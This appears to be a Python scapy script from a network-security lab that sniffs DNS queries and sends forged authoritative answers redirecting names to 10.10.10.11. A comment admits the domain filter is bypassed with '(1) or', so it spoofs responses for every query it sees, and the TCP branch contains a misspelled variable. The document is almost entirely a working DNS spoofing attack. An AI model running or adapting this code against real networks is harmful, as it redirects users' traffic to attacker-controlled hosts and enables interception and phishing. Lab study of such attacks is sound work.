from scapy.all import *

#set network adapter
IFACE = "eth0" #scapy -> IFACES  #Intel(R) Centrino(R) Wireless-N 2230

def dns_monitor_callback(getDNSPacket):
		#check whether the sniffed DNS packet is of interest
		if ( getDNSPacket[0].haslayer(DNS) ) and  ( getDNSPacket[0].getlayer(DNS).qr == 0 ) and (getDNSPacket[0].getlayer(DNS).qd.qtype == 1) and ( getDNSPacket[0].getlayer(DNS).qd.qclass == 1 ) :

				#filter for that one specific page
				clientDNSQuery = getDNSPacket[0].getlayer(DNS).qd.qname

				print ("\nQuery: %s" % clientDNSQuery)

				#testpacket = DNS(rd=1,qd=DNSQR(qname="malheur.netsec.seclab-bonn.de"))
				#print (testpacket.getlayer(DNS).qd.qname)

				###																										  						###
				### This if statement doesn't work for some reason. Bypassing it with '(1) or ...' results in a DNS Spoofing for all DNSQuerys. ###
				###																										                        ###
				if (1) or ( clientDNSQuery == 'malheur.netsec.seclab-bonn.de' ) : #or (testpacket.getlayer(DNS).qd.qname == clientDNSQuery) :
						print("\nFound Query for malheur.netsec.seclab-bonn.de !!!")

	  					#Store DNS-Data
						clientDNSQueryID = getDNSPacket[0].getlayer(DNS).id
						clientDNSQueryDataCount = getDNSPacket[0].getlayer(DNS).qdcount
						clientDNSServer = getDNSPacket[0].getlayer(IP).dst

						#Find out whether UDP or TCP is used and store source port
						if getDNSPacket[0].haslayer(UDP) :
								clientSrcPort = getDNSPacket[0].getlayer(UDP).sport
						elif getDNSPacket[0].haslayer(TCP) :
								clientSrcPort = getDNSPacket[0].getlayer(TCP).sport
						else :
								pass

						clientSrcIP = getDNSPacket[0].getlayer(IP).src

	        			#Start building the spoofed packet
						spoofedDNSServerIP = '10.10.10.11'

						spoofedIPPkt = IP(src=spoofedDNSServerIP,dst=clientSrcIP)
						if getDNSPacket[0].haslayer(UDP) :
								spoofedUDP_TCPPacket = UDP(sport=53,dport=clientSrcPort)
						elif getDNSPacket[0].haslayer(TCP) :
								spoofedUDP_TCPPPacket = TCP(sport=53,dport=clientSrcPort)
						else :
								pass

						spoofedDNSPacket = DNS(id=clientDNSQueryID,qr=1,opcode=getDNSPacket[0].getlayer(DNS).opcode,aa=1,rd=0,ra=0,z=0,rcode=0,qdcount=clientDNSQueryDataCount,ancount=1,nscount=1,arcount=1,
	                    		qd=DNSQR(qname=clientDNSQuery,qtype=getDNSPacket[0].getlayer(DNS).qd.qtype,qclass=getDNSPacket[0].getlayer(DNS).qd.qclass),
	                               an=DNSRR(rrname=clientDNSQuery,rdata=spoofedDNSServerIP,ttl=86400),
	                               ns=DNSRR(rrname=clientDNSQuery,type=2,ttl=86405,rdata=spoofedDNSServerIP),
	                               ar=DNSRR(rrname=clientDNSQuery,rdata=spoofedDNSServerIP))

	        			#Send off the spoofed packet
						sendp(Ether()/spoofedIPPkt/spoofedUDP_TCPPacket/spoofedDNSPacket,iface=IFACE, count=1)
				else :
	        			pass
		else :
				pass

sniff(prn=dns_monitor_callback, iface=IFACE, filter="dst port 53", store=0)
